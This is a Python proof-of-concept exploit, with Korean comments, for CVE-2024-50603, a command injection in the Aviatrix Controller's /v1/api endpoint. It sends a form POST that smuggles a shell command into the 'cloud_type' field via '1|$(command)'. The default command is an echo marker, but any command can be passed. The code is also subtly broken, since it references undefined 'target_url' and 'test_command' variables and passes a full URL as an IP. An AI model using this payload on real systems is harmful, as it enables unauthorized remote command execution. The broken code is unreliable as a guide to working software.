# SPDX-FileCopyrightText: © 2025 KimJuhyeong95 <bisyop@naver.com>
# SPDX-License-Identifier: MIT

import requests

def test_cve_2024_50603(target_ip, command="echo VULN_TEST_50603"):
    # Aviatrix Controller 취약점(CVE-2024-50603) PoC 함수
    # 기본 명령어는 echo VULN_TEST_50603

    url = f"http://{target_ip}/v1/api"
    
    payload = {
        "action": "list_flightpath_destination_instances",  # 명령어 실행이 일어나는 핵심 트리거
        "CID": "anything",
        "account_name": "1",
        "region": "1",
        "vpc_id_name": "1",
        "cloud_type": f"1|$({command})"  # 명령어 삽입 위치
    }

     # 요청 헤더 설정
    headers = {
        "Content-Type": "application/x-www-form-urlencoded",  # 폼 데이터 형식
        "User-Agent": "PoC-CVE-2024-50603"  # 식별용 사용자 에이전트
    }

    try:
        print(f"[+] 대상: {target_url}")
        print(f"[+] 명령 삽입: {test_command}")
        
        # HTTP POST 요청 보내기 (폼 데이터 형식)
        response = requests.post(target_url, data=payload, headers=headers, timeout=10)

        # 응답 상태 코드 출력
        print("[+] 응답 코드:", response.status_code)
        # 응답 내용 앞부분 일부 출력 (500자)
        print("[+] 응답 내용 일부:")
        print(response.text[:500])

        # 응답에 테스트 문자열이 포함되어 있는지 확인
        if "VULN_TEST_50603" in response.text:
            print("[!!] 취약점 존재 가능성 있음: 명령 실행 결과 감지됨.")
        else:
            print("[+] 명령 실행 결과는 응답에서 확인되지 않음.")
    except Exception as e:
        # 요청 실패 시 에러 메시지 출력
        print(f"[!] 요청 실패: {e}")

if __name__ == "__main__":
    # 사용자로부터 테스트할 대상 API URL 입력 받기
    target = input("대상 API URL을 입력하세요 (예: http://IP:포트/v1/api) >> ").strip()
    # 함수 실행
    test_cve_2024_50603(target)
